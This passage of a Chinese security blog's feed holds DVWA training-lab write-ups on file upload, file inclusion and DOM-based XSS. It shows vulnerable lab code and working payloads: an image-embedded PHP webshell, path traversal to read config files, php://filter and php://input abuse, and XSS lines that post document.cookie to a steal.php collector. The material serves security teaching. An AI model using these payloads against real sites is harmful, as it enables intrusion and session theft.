class="line">$name=$_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">$tmp_name=$_FILES[&apos;file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">$size=$_FILES[&apos;file&apos;][&apos;size&apos;];</span><br><span class="line">$txt=substr($name,strrpos($name,&apos;.&apos;)+1);</span><br><span class="line"></span><br><span class="line">if((strtolower($txt) == &apos;jpg&apos; || strtolower($txt) == &apos;jpeg&apos; || strtolower($txt) == &apos;png&apos;) &amp;&amp; $size &lt; 100000 &amp;&amp; getimagesize($tmp_name))&#123;</span><br><span class="line">$target_path=&quot;C:/phpStudy/PHPTutorial/WWW/demo/file-upload/uploaded/&quot;;</span><br><span class="line">$target_path .= basename($name);</span><br><span class="line">if(!move_uploaded_file($tmp_name,$target_path))&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>先了解几个函数</p><p>strpos：搜索字符串在另一字符串中第一次出现的位置（区分大小写）</p><p>stripos：搜索字符串在另一字符串中第一次出现的位置（不区分大小写）</p><p>strrpos：搜索字符串在另一字符串中最后一次出现的位置（区分大小写）</p><p>strripos：搜索字符串在另一字符串中最后一次出现的位置（不区分大小写）</p><p>举个例子说明：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$str=<span class="string">"I love php,the greatest language is php."</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> stripos($str,<span class="string">'PHP'</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> strpos($str,<span class="string">'PHP'</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> strrpos($str,<span class="string">'PHP'</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> strrpos($str,<span class="string">'php'</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> strripos($str,<span class="string">'PHP'</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>而getimagesize函数会检测上传文件头，如果不包含相关的图片文件头，则报错</p><p>也就是说我们上传的文件名后缀必须是jpg,jepg,png，而且文件头必须是图像类型</p><p>在上一关中，是对上传文件的类型进行检查，如果不是图片类型则过滤，所以我们可以用burpsuite将发向服务器的请求中的文件名改为.php的后缀，这样类型依然是图片，就能巧妙的绕过过滤</p><p>而这一关是对上传文件的名字进行了检查，名字的后缀必须是.jpg或者.png或者.jpeg，而且文件的头信息必须是图片，上一关的方法修改文件名明显行不通，也就是说我们必须老实上传一个图片文件</p><p>但是我们可以将php代码加入到图片中</p><p>我们先创建一个一句话木马文件和一个图片文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再打开cmd，利用copy命令将两个文件合并为一个文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>打开合并后的文件可以看到，一句话木马被加到了最后</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后上传</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功通过检查</p><p>接下来打开菜刀</p><p>右键添加</p><p><a href="http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file:///C:/phpStudy/PHPTutorial/WWW/dvwa/hackable/uploads/hack.jpg" target="_blank" rel="noopener">http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file:///C:/phpStudy/PHPTutorial/WWW/dvwa/hackable/uploads/hack.jpg</a></p><p>参数名写apple，脚本语言选择php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功拿到webshell</p>]]></content>
    
    <summary type="html">
    
      dvwa-file upload
    
    </summary>
    
      <category term="dvwa-file upload" scheme="https://Foxgrin.github.io/categories/dvwa-file-upload/"/>
    
    
      <category term="file upload" scheme="https://Foxgrin.github.io/tags/file-upload/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-file inclusion</title>
    <link href="https://Foxgrin.github.io//posts/13543/"/>
    <id>https://Foxgrin.github.io//posts/13543/</id>
    <published>2018-07-11T14:16:00.000Z</published>
    <updated>2018-07-12T08:27:35.166Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的文件包含漏洞的关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;page&apos;]))&#123;</span><br><span class="line">include($_GET[&apos;page&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">header(&quot;location:?page=include.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从源代码可以看出，当用户没有GET一个page值时，会自动给page赋值一个include.php，而这个include.php中就包含了三个文件给用户选择，希望用户能点击这三个文件进行文件包含</p><p>但是从攻击者的角度来看，当然不会乖乖的去点击这三个文件，因为page参数是不经过过滤，我们可以读取我们想要读的文件，前提是文件存在对应的目录。 </p><p>我们先要清楚，如果包含的是php文件，则正确包含，如果不是php文件，则原封不动的将文件内容输出到页面上 </p><p>这里说的php文件不一定是后缀名是php的文件，任何后缀文件只要里面包含了符合php语法的语句，通过文件包含函数include后，里面合法的代码就会被执行</p><p>举个例子，我们先在目录中创建一个phpinfo.txt </p><p>文件内容是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后给服务器GET一个page值为phpinfo.txt</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现正常显示phpinfo信息，由此可知，只要文件内容符合php语法规范，那么任何扩展名都可以被php解析</p><p>再将phpinfo.txt信息修改为非php语法规范的语句</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>同样给服务器GET一个page值为phpinfo.txt</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现暴露其源代码</p><p>所以我们可以利用这个特性，查看一些配置文件信息</p><p>首先要想查看文件信息，必定要弄清楚目录</p><p>我们先随便输入一个xxx.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现这个文件不存在，报错了，但同时把文件的绝对路径爆出来了</p><p>知道文件路径后，我们就可以查看一些配件文件，比如php配置信息</p><p>输入<a href="http://127.0.0.1/demo/file-inclusion/low.php?page=C:\phpStudy\PHPTutorial\WWW\dvwa/php.ini" target="_blank" rel="noopener">http://127.0.0.1/demo/file-inclusion/low.php?page=C:\phpStudy\PHPTutorial\WWW\dvwa/php.ini</a> </p><p>或者输入../../../../../../../phpStudy/PHPTutorial/WWW/dvwa/php.ini </p><p>输入这么多的../是为了保证能回到根目录下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再看一下mysql配置信息</p><p>输入<a href="http://127.0.0.1/demo/file-inclusion/low.php?page=C:\phpStudy\PHPTutorial\mysql\my.ini" target="_blank" rel="noopener">http://127.0.0.1/demo/file-inclusion/low.php?page=C:\phpStudy\PHPTutorial\mysql\my.ini</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>还可以使用php内置封装协议来读取php文件</p><p>输入?php://filter/read=convert.base64-encode/resource=include.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现一段被base64加密过后的php源代码，经过解密后就可以得到php文件原本的代码 </p><p><img src="/img/dvwa-file-inclusion/8.png" alt=""></p><p>再用php://input写入php命令，前提是allow_url_include选项要为on</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在burpsuite中提交数据 </p><p><img src="/img/dvwa-file-inclusion/10.png" alt=""></p><p>发现提交的命令被执行了，那么是不是可以像xss一样提交恶意的脚本代码呢</p><p>我们提交</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(‘xss’)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现成功执行</p><p>我们再看看可不可以窃取cookie</p><p>输入 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span><span class="string">"&lt;script src='http://127.0.0.1/demo/xss(stored)/cookie.js'&gt;&lt;/script&gt;"</span>  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现成功跳转到steal.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功窃取到cookie值 </p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;page&apos;]))&#123;</span><br><span class="line">$page=$_GET[&apos;page&apos;];</span><br><span class="line">$page=str_replace(array(&apos;http://&apos;,&apos;https://&apos;),&apos;&apos;,$page);</span><br><span class="line">$page=str_replace(array(&quot;../&quot;,&quot;..\&quot;&quot;),&apos;&apos;,$page);</span><br><span class="line">//echo $page.&quot;&lt;br&gt;&quot;;</span><br><span class="line">include($page);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">header(&quot;location:?page=include.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看出对http:// 和https://，../和..\有过滤，但是因为是str_replace函数，所以双写即可绕过</p><p>而且如果读取绝对路径的话，就没有什么影响</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>先看一下当前php文件的绝对路径 </p><p><img src="/img/dvwa-file-inclusion/17.png" alt=""></p><p>复写../构造路径读取php配置文件 </p><p><img src="/img/dvwa-file-inclusion/18.png" alt=""></p><p>读取mysql配置文件</p><p>使用php内置协议读取文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>任意命令执行 </p><p><img src="/img/dvwa-file-inclusion/20.png" alt=""></p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;page&apos;]))&#123;</span><br><span class="line">$page=$_GET[&apos;page&apos;];</span><br><span class="line">if(!fnmatch(&apos;file*&apos;,$page) &amp;&amp; $page != &apos;include.php&apos;)&#123;</span><br><span class="line">echo &quot;ERROR:File not found&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">include($page);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">header(&quot;location:?page=include.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Fnmatch函数作用是在page值中搜索指定模式，指定必须以file开头的字符串才返回true，而我们要执行include，就必须不让if语句执行，所以page值必须以file开头</p><p>看似完全限制了，但是我们可以用file协议进行读取文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      dvwa-file inclusion
    
    </summary>
    
      <category term="dvwa-file inclusion" scheme="https://Foxgrin.github.io/categories/dvwa-file-inclusion/"/>
    
    
      <category term="file inclusion" scheme="https://Foxgrin.github.io/tags/file-inclusion/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-xss(dom)</title>
    <link href="https://Foxgrin.github.io//posts/61192/"/>
    <id>https://Foxgrin.github.io//posts/61192/</id>
    <published>2018-07-11T13:38:00.000Z</published>
    <updated>2018-07-11T14:11:08.637Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的dom型xss关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=&quot;XSS&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;p&gt;Please choose a language:&lt;/p&gt;</span><br><span class="line">&lt;select name=&quot;default&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">if(document.location.href.indexOf(&apos;default=&apos;)&gt;=0)&#123;</span><br><span class="line">var lang = document.location.href.substring(document.location.href.indexOf(&apos;default=&apos;)+8);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&quot;+lang+&quot;&apos;&gt;&quot;+decodeURI(lang)+&quot;&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;input type=&apos;submit&apos; value=&apos;Select&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;low&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关没有php代码，但是我们可以仔细一步步分析js代码</p><p>首先明白几个对象：</p><p>document:每个载入浏览器的html文档都会成为document对象</p><p>location:location对象包含了当前相关的url信息，href是location对象的属性，location.href能返回完整的URL</p><p>几个方法：</p><p>indexOf：string.indexOf(searchvalue)返回搜索的子字符串在原字符串中第一次出现 的位置，如果搜索的字符串不存在，则返回-1</p><p>substring:string.substring(start，stop)提取字符串中介于两个指定下标之间的字符</p><p>从start处开始提取，到stop位置但不包括stop位置的字符，如果stop参数省略，则返回从start处开始到结束的字符</p><p>明白了这几个对象和方法后再来看这串js代码</p><p>If语句执行条件是检查url中是否含有’default=’这个字符串，如果有则执行if语句</p><p>也就是说if语句执行条件是必须通过GET方式传入一个default值才会执行if语句</p><p>执行之后定义一个变量lang，存储的是url中’default=’之后到结束的字符，也就是default的值</p><p>之后将lang进行url解码然后写入option标签中</p><p>这里没有php代码，也就是并没有与服务器交互，但是我们可以通过dom树解析js代码进行xss注入，也就是通过GET一个default值注入JS代码，然后执行if语句，就可以执行我们注入的JS代码，这就属于dom型的xss</p><p>于是我们输入default:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(“xss”)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>果然出现了弹窗</p><p>接下来考虑窃取cookie值</p><p>按之前的方法利用ajax将cookie值传入steal.php，再将cookie值写入数据库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功截取到cookie值</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=&quot;XSS&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;p&gt;Please choose a language:&lt;/p&gt;</span><br><span class="line">&lt;select name=&quot;default&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">if(document.location.href.indexOf(&quot;default=&quot;)&gt;=0)&#123;</span><br><span class="line">var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&quot;+lang+&quot;&apos;&gt;&quot;+decodeURI(lang)+&quot;&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;input type=&apos;submit&apos; value=&apos;Select&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">setcookie(&apos;security&apos;,&apos;medium&apos;,time()+3600);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&apos;default&apos;,$_GET) &amp;&amp; $_GET[&apos;default&apos;] != NULL)&#123;</span><br><span class="line">if(stripos($_GET[&apos;default&apos;],&apos;&lt;script&apos;) !== false)&#123;</span><br><span class="line">header(&quot;location:?default=English&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看出在服务器端对GET的default值进行了过滤，一旦检测到defalut值中含有&lt;script，就立刻重定向到default值为English的页面</p><p>解决方法是利用字符#，该字符后的数据不会发送到服务器端，从而绕过服务器的过滤，输入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#default=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(“xss”)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#default=<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">”http://127.0.0.1/demo/xss(stored)/cookie.js”</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功窃取到cookie值 </p><p>还有一种方法就是通过触发onerror事件来执行js代码</p><p>输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">(alert(”xss”))</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>但是发现并没有弹框，为什么呢，仔细看一下代码发现img标签是包含在option标签里面的，所以img标签并不会被解析</p><p>这里要闭合option标签和select标签才可以解析出img标签</p><p>输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">(alert(‘xss’))</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功弹框</p><p>但是因为我们提前闭合了option和select标签，所以后面的select结构都会被破坏，整个页面结构都被破坏了，所以这种方法并不是很实用</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再试试通过onerror事件执行ajax代码，将cookie值发送给steal.php，然后写入数据库 </p><p>输入 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">'var url="http://127.0.0.1/demo/xss(reflected)/steal.php";var postStr="data="+document.cook&amp;#x69;e;var ajax=null;&amp;#x69;f(w&amp;#x69;ndow.XMLHttpRequest)&#123;ajax=new XMLHttpRequest();&#125;else &amp;#x69;f(w&amp;#x69;ndow.Act&amp;#x69;veXObject)&#123;ajax=new Act&amp;#x69;veXObject("M&amp;#x69;crosoft.XMLHTTP");&#125;else&#123;ajax=null;&#125;ajax.open("POST", url, true);ajax.setRequestHeader("Content-Type", "appl&amp;#x69;cat&amp;#x69;on/x-www-form-urlencoded");ajax.send(postStr);'</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-xss-dom/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功截取到cookie值 </p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=&quot;XSS&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;p&gt;Please choose a language:&lt;/p&gt;</span><br><span class="line">&lt;select name=&quot;default&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">if(document.location.href.indexOf(&quot;default=&quot;)&gt;=0)&#123;</span><br><span class="line">var lang = 